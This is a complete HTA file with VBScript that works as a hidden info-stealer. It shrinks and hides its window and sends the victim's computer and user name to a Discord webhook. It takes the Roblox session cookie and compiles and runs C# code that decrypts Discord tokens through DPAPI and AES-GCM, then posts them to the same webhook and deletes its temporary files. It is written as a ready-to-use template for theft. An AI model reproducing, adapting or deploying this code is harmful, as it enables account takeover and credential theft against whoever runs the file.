<html><head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, appdata, localappdata
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==========================================
' PUT YOUR WEBHOOK URL HERE (KEEP THE QUOTES)
' ==========================================
WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"

appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
temp = sh.ExpandEnvironmentStrings("%TEMP%")

Call PostEmbed(":desktop: System Info", "**PC:** " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%") & vbCrLf & "**User:** " & sh.ExpandEnvironmentStrings("%USERNAME%"), 3447003)

' 1. Discord
Call RunCSharp

' 2. Roblox
Call GrabRoblox

window.close()

Sub GrabRoblox()
    Dim rPath : rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
    If fso.FileExists(rPath) Then
        Dim raw : raw = ReadFileText(rPath)
        If InStr(raw, "_|WARNING") > 0 Then
            Dim startPos : startPos = InStr(raw, "_|WARNING")
            Dim cookie : cookie = Mid(raw, startPos)
            Dim endPos : endPos = InStr(cookie, """")
            If endPos > 0 Then cookie = Left(cookie, endPos - 1)
            Call PostEmbed(":cookie: Roblox Cookie", cookie, 65280)
        Else
            Call PostEmbed(":warning: Roblox", "Found file, but no plaintext cookie inside (encrypted).", 16776960)
        End If
    Else
        Call PostEmbed(":x: Roblox", "No Roblox cookie file found at: " & rPath, 16711680)
    End If
End Sub

Sub RunCSharp()
    Dim csFile : csFile = temp & "\d.cs"
    Dim exeFile : exeFile = temp & "\d.exe"
    
    ' Minimal C# script to test if compiler works and finds Discord
    Dim code : code = "using System; using System.IO; using System.Text; using System.Text.RegularExpressions; using System.Security.Cryptography; using System.Runtime.InteropServices; " & _
    "class P { " & _
    "  [DllImport(""crypt32.dll"", SetLastError=true)] static extern bool CryptUnprotectData(byte[] pDataIn, IntPtr ppszDataDescr, byte[] pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, out DATA_BLOB pDataOut); " & _
    "  [StructLayout(LayoutKind.Sequential)] struct DATA_BLOB { public int cbData; public IntPtr pbData; } " & _
    "  static byte[] Dpapi(byte[] data) { DATA_BLOB inBlob = new DATA_BLOB(); inBlob.cbData = data.Length; inBlob.pbData = Marshal.AllocHGlobal(data.Length); Marshal.Copy(data, 0, inBlob.pbData, data.Length); DATA_BLOB outBlob; CryptUnprotectData(null, IntPtr.Zero, null, IntPtr.Zero, IntPtr.Zero, 0, out outBlob); byte[] outData = new byte[outBlob.cbData]; Marshal.Copy(outBlob.pbData, outData, 0, outBlob.cbData); return outData; } " & _
    "  static void Main(string[] args) { " & _
    "    try { " & _
    "      string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); " & _
    "      string lsPath = Path.Combine(appdata, @""discord\Local State""); " & _
    "      if (!File.Exists(lsPath)) { Console.WriteLine(""FAIL|No Local State found at "" + lsPath); return; } " & _
    "      string ls = File.ReadAllText(lsPath); " & _
    "      Match lm = Regex.Match(ls, @""encrypted_key\\""\s*:\s*\\""([^\\""]+)\\""""); " & _
    "      if (!lm.Success) { Console.WriteLine(""FAIL|Could not parse encrypted_key""); return; } " & _
    "      byte[] encKey = Convert.FromBase64String(lm.Groups[1].Value); " & _
    "      byte[] keyBytes = new byte[encKey.Length - 5]; Array.Copy(encKey, 5, keyBytes, 0, keyBytes.Length); " & _
    "      byte[] masterKey = Dpapi(keyBytes); " & _
    "      string ldPath = Path.Combine(appdata, @""discord\Local Storage\leveldb""); " & _
    "      if (!Directory.Exists(ldPath)) { Console.WriteLine(""FAIL|No LevelDB found""); return; } " & _
    "      int found = 0; " & _
    "      foreach (string f in Directory.GetFiles(ldPath, ""*.*"")) { " & _
    "        if (!f.EndsWith("".ldb"") && !f.EndsWith("".log"")) continue; " & _
    "        string txt = File.ReadAllText(f); " & _
    "        foreach (Match m in Regex.Matches(txt, @""dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,400})"")) { " & _
    "          try { " & _
    "            string b64 = m.Groups[1].Value; while (b64.Length % 4 != 0) b64 += ""=""; " & _
    "            byte[] eb = Convert.FromBase64String(b64); " & _
    "            byte[] nonce = new byte[12]; Array.Copy(eb, 3, nonce, 0, 12); " & _
    "            byte[] tag = new byte[16]; Array.Copy(eb, eb.Length - 16, tag, 0, 16); " & _
    "            byte[] ct = new byte[eb.Length - 19]; Array.Copy(eb, 15, ct, 0, ct.Length); " & _
    "            using (AesGcm aes = new AesGcm(masterKey)) { " & _
    "              byte[] pt = new byte[ct.Length]; aes.Decrypt(nonce, ct, tag, pt); " & _
    "              string token = Encoding.UTF8.GetString(pt).TrimEnd('\0'); " & _
    "              if (token.Length > 40) { Console.WriteLine(""TOKEN|"" + token); found++; } " & _
    "            } " & _
    "          } catch {} " & _
    "        } " & _
    "      } " & _
    "      if (found == 0) Console.WriteLine(""FAIL|Searched LevelDB, found 0 tokens""); " & _
    "    } catch (Exception ex) { Console.WriteLine(""FAIL|"" + ex.Message); } " & _
    "  } " & _
    "}"

    Dim f: Set f = fso.CreateTextFile(csFile, True)
    f.Write code
    f.Close

    Dim csc : csc = sh.ExpandEnvironmentStrings("%WINDIR%") & "\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
    If Not fso.FileExists(csc) Then
        Call PostEmbed(":x: Compiler Error", "csc.exe not found at: " & csc, 16711680)
        Exit Sub
    End If

    sh.Run "cmd /c """ & csc & """ /target:exe /out:""" & exeFile & """ """ & csFile & """ > """ & temp & "\compile_log.txt"" 2>&1", 0, True

    If Not fso.FileExists(exeFile) Then
        Dim errLog : errLog = ReadFileText(temp & "\compile_log.txt")
        Call PostEmbed(":x: Compile Failed", "```" & Left(errLog, 1000) & "```", 16711680)
        Exit Sub
    End If

    Dim exec: Set exec = sh.Exec("""" & exeFile & """")
    Dim output : output = exec.StdOut.ReadAll
    
    If Len(output) > 5 Then
        Dim lines : lines = Split(output, vbCrLf)
        Dim l
        For Each l In lines
            If Left(l, 6) = "TOKEN|" Then
                Call PostEmbed(":gift: Discord Token", "**Token:** " & Mid(l, 7), 5793266)
            ElseIf Left(l, 5) = "FAIL|" Then
                Call PostEmbed(":x: Discord Fail", Mid(l, 6), 16711680)
            End If
        Next
    Else
        Call PostEmbed(":x: Discord", "C# ran, but returned no output.", 16711680)
    End If

    On Error Resume Next
    fso.DeleteFile csFile, True
    fso.DeleteFile exeFile, True
    fso.DeleteFile temp & "\compile_log.txt", True
    On Error GoTo 0
End Sub

Function ReadFileText(path)
    ReadFileText = ""
    Dim f: Set f = fso.OpenTextFile(path, 1)
    ReadFileText = f.ReadAll
    f.Close
End Function

Sub PostEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
End Sub

Function Ej(s)
    Dim i, c, out
    out = ""
    For i = 1 To Len(s)
        c = Asc(Mid(s, i, 1))
        If c >= 32 Or c = 9 Or c = 10 Or c = 13 Then out = out & Mid(s, i, 1)
    Next
    out = Replace(out, Chr(92), Chr(92) & Chr(92))
    out = Replace(out, Chr(34), Chr(92) & Chr(34))
    out = Replace(out, vbCrLf, Chr(92) & "n")
    out = Replace(out, vbCr, Chr(92) & "n")
    out = Replace(out, vbLf, Chr(92) & "n")
    out = Replace(out, vbTab, Chr(92) & "t")
    Ej = out
End Function
</script>
</head><body></body></html>
